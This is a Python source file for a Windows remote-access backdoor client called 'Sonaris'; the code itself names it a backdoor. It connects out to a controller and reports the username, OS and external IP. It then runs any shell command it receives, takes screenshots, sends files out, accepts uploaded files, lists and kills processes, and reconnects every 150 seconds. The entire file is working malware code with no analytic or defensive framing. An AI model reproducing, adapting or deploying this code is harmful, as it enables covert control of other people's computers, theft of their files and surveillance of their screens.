#!/usr/bin/python3
#coding: utf-8

__authors__ = ''
__version__ = ''
__contact__ = ''


from subprocess import getoutput
from socket import socket, AF_INET, SOCK_STREAM
from pyautogui import screenshot
from getpass import getuser
from os import path, chdir, remove
from sys import exit
from time import sleep
from pickle import loads, dumps
from platform import uname
from wmi import WMI
import psutil

# get external ip #
from requests import get, packages
from requests.packages.urllib3.exceptions import InsecureRequestWarning

packages.urllib3.disable_warnings(InsecureRequestWarning)

class Sonaris(object):
    ''' client object '''
    def __init__(self, host, port, ip):
        self.__Adress = (host, port)
        self.__Client = None
        self._CmdBufferSize = 256
        self._HeaderBufferSize = 512
        self._FullBufferSize = 65536
        self.Path = 'C:/Windows/Temp/736f6e61726973.png'
        self.Info = {
                'ComputerName': f'{getuser()}',
                'SO': f'{uname()[0]}',
                'Arch': f'{uname()[4]}',
                'ExternalAdress': ip
                }

    def CreateSocket(self):
        try:
            self.__Client = socket(AF_INET, SOCK_STREAM)
            self.__Client.connect(self.__Adress)
            return True
        except:
            return False

    def GetProcessList(self):
        try:
            process = WMI()
            proclist = dumps({f"  | -{proc.ProcessId:<10} | -{proc.Name}" for proc in process.Win32_Process()})
            self.__Client.send(proclist)
        except:
            self.__Client.send('err.proclist'.encode())

    def KillProcess(self, processname):
        try:
            if([proc.terminate() for proc in psutil.process_iter() if proc.name() == processname]):
                self.__Client.send(f' Process {processname} has been terminated...'.encode())
            else:
                self.__Client.send(f' Process {processname} does not exist...'.encode())
        except psutil.NoSuchProcess:
            self.__Client.send(f' Error, no process found with name: {processname}...'.encode())
        except psutil.AccessDenied:
            self.__Client.send(f' Error, access denied...'.encode())
        except ValueError:
            self.__Client.send(f' Error, invalid parameters...'.encode())

    def SavingSmallFile(self, header):
        with open(f'{header["name"]}{header["extension"]}', 'wb') as file:
            file_downloaded = self.__Client.recv(self._FullBufferSize)
            file.write(file_downloaded)
            file.close()

    def SavingLargeFile(self, header):
        file_downloaded = b''
        while True is not False:
            if(len(file_downloaded) >= header['numofbytes']):
                break
            else:
                file_downloaded += self.__Client.recv(header['numofbytes'])

        with open(f'{header["name"]}{header["extension"]}', 'wb') as file:
            file.write(file_downloaded)
            file.close()

    def UploadFiles(self):
        try:
            self.__Client.send('ok'.encode())
            header = loads(self.__Client.recv(self._HeaderBufferSize))

            if(header["numofbytes"] >= self._FullBufferSize):
                self.SavingLargeFile(header)
                self.__Client.send(f'File {header["name"]} successfully sent and received...'.encode())
            else:
                self.SavingSmallFile(header)
                self.__Client.send(f'File {header["name"]} successfully sent and received...'.encode())
        except:
            pass

    def SaveScreenshot(self):
        screenshot().save(self.Path)

    def Screenshot(self):
        try:
            self.SaveScreenshot()
            with open(self.Path, 'rb') as file:
                file = file.read()
                name, extension = path.splitext('736f6e61726973.png'.strip())
                len_bytes = len(file)
                header = {
                    'name': name,
                    'extension': extension,
                    'numofbytes': len_bytes
                }

                self.__Client.send(dumps(header))
                sleep(0.6)
                self.__Client.send(file)

            remove(self.Path)
        except:
            self.__Client.send('astronidak.err'.encode())

    def DownloadFiles(self, namefile):
        try:
            with open(str(namefile.strip()), 'rb') as file:
                name, extension = path.splitext(namefile.strip())
                file = file.read()
                len_bytes = len(file)
                header = {
                    "name": name,
                    "extension": extension,
                    "numofbytes": len_bytes,
                    }
                self.__Client.send(dumps(header))
                sleep(0.6)
                self.__Client.send(file)

        except FileNotFoundError:
            self.__Client.send(f'[*] File corrupt or not found...'.encode())
        except PermissionError:
            self.__Client.send(f'[*] Action not permited...'.encode())
        except:
            self.__Client.send(f'[*] Action not permited...'.encode())

    def SendCommands(self, command):
        command = getoutput(f'{command}')
        if(command != ''):
            if(len(command) >= 16384):
                self.__Client.send(command[:16376].encode())
            else:
                self.__Client.send(command.encode())
        else:
            self.__Client.send('.'.encode())

    def BultinCommands(self, command):
        if(command[:2] == 'cd'):
            try:
                chdir(command[3:])
                self.__Client.send('..'.encode())
            except FileNotFoundError:
                self.__Client.send(f' No such file or directory: {command[3:]}'.encode())
        elif(command.strip() == '/info'):
            self.__Client.send(f'{self.Info}'.encode())
        elif(command.strip() == '/getprocesslist'):
            self.GetProcessList()
        elif(command.strip()[:5] == '/kill'):
            self.KillProcess(command.strip()[6:])
        elif(command[:9] == '/download'):
            self.DownloadFiles(command[10:])
        elif(command == '/screenshot'):
            self.Screenshot()
        elif(command[:7] == '/upload'):
            self.UploadFiles()
        else:
            return command

    def VerifyCommands(self, command):
        if(self.BultinCommands(command) != None):
            self.SendCommands(command)

    def Listening(self):
        try:
            while True is not False:
                command = self.__Client.recv(self._CmdBufferSize)
                if(not command):
                    self.__Client.close()
                    break
                elif(command.decode('utf-8') == '/exit'):
                    self.__Client.close()
                    break
                else:
                    self.VerifyCommands(command.decode('utf-8', errors="ignore"))
        except:
            pass

    def Main(self):
        if(self.CreateSocket() == True):
            self.__Client.send(f' {self.Info["ComputerName"]}'.encode())
            self.Listening()



def main():
    try:
        ip = get('https://api.ipify.org/').content.decode()
    except:
        ip = 'Error'

    backdoor = Sonaris('127.0.0.1', 0000, ip)
    backdoor.Main()

if(__name__ == '__main__'):
    while True is not False:
        main()
        # two and a half minutes #
        sleep(150)